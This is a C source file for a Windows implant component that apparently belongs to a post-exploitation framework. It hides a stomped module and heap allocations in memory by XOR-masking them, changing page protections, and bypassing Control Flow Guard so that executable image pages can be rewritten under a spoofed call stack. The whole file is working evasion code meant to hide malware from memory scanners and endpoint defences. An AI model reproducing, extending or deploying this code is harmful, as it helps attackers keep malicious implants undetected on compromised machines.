#include <windows.h>
#include "memory.h"
#include "../cfg/cfg.h"

DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQuery ( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T ); //used to query the memory range of the stomped module
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

char xorkey [ 128 ] = { 1 };

void apply_mask ( char * data, DWORD len )
{
    for ( DWORD i = 0; i < len; i++ ) {
        data [ i ] ^= xorkey [ i % 128 ];
    }
}

BOOL is_writeable ( DWORD protection )
{
    if ( protection == PAGE_EXECUTE_READWRITE ||
         protection == PAGE_EXECUTE_WRITECOPY ||
         protection == PAGE_READWRITE         ||
         protection == PAGE_WRITECOPY )
    {
        return TRUE;
    }
    return FALSE;
}

void xor_section ( MEMORY_SECTION * section, BOOL mask )
{
    if ( mask == TRUE && is_writeable ( section->CurrentProtect ) == FALSE )
    {
        DWORD old_protect = 0;

        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, PAGE_WRITECOPY, &old_protect ) )
        {
            section->CurrentProtect  = PAGE_WRITECOPY;
            section->PreviousProtect = old_protect;
        }
    }

    if ( is_writeable ( section->CurrentProtect ) ) {
        apply_mask ( section->BaseAddress, section->Size );
    }

    if ( mask == FALSE && section->CurrentProtect != section->PreviousProtect )
    {
        DWORD old_protect = 0;

        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, section->PreviousProtect, &old_protect ) )
        {
            section->CurrentProtect  = section->PreviousProtect;
            section->PreviousProtect = old_protect;
        }
    }
}

void xor_dll ( DLL_MEMORY * region, BOOL mask )
{
    for ( size_t i = 0; i < region->Count; i++ ) {
        xor_section ( &region->Sections [ i ], mask );
    }
}

void xor_heap ( HEAP_MEMORY * heap )
{
    for ( size_t i = 0; i < heap->Count; i++ )
    {
        HEAP_RECORD * record = &heap->Records [ i ];

        /* these are already RW */
        apply_mask ( record->Address, record->Size );
    }
    
}

void mask_memory ( MEMORY_LAYOUT * memory, BOOL mask )
{
    ULONG_PTR base    = ( ULONG_PTR ) memory->Dll.BaseAddress;
    ULONG_PTR end     = base + memory->Dll.Size;
    ULONG_PTR current = base;

    while ( current < end )
    {
        MEMORY_BASIC_INFORMATION mbi;

        if ( !KERNEL32$VirtualQuery ( ( LPCVOID ) current, &mbi, sizeof ( mbi ) ) )
            break;

        if ( mbi.State  == MEM_COMMIT        &&
           !( mbi.Protect & PAGE_GUARD )     &&
             mbi.Protect != PAGE_NOACCESS )
        {
            DWORD old_protect = 0;
            BOOL  is_exec     = ( mbi.Protect == PAGE_EXECUTE_READ ||
                                  mbi.Protect == PAGE_EXECUTE      ||
                                  mbi.Protect == PAGE_EXECUTE_READWRITE );

            /* CFG blocks VirtualProtect with spoofed call stack on
             * executable MEM_IMAGE pages — bypass it first          */
            if ( is_exec && mbi.Type == MEM_IMAGE ) {
                bypass_cfg ( mbi.BaseAddress );
            }

            /* executable sections need EXECUTE_WRITECOPY,
             * non-executable image sections need WRITECOPY,
             * private sections accept READWRITE                     */
            DWORD write_prot;
            if ( is_exec ) {
                write_prot = PAGE_EXECUTE_WRITECOPY;
            } else if ( mbi.Type == MEM_IMAGE ) {
                write_prot = PAGE_WRITECOPY;
            } else {
                write_prot = PAGE_READWRITE;
            }

            if ( KERNEL32$VirtualProtect ( mbi.BaseAddress, mbi.RegionSize,
                                           write_prot, &old_protect ) )
            {
                apply_mask ( ( char * ) mbi.BaseAddress, mbi.RegionSize );
                KERNEL32$VirtualProtect ( mbi.BaseAddress, mbi.RegionSize,
                                          old_protect, &old_protect );
            }
        }

        current = ( ULONG_PTR ) mbi.BaseAddress + mbi.RegionSize;
    }

    xor_heap ( &memory->Heap );
}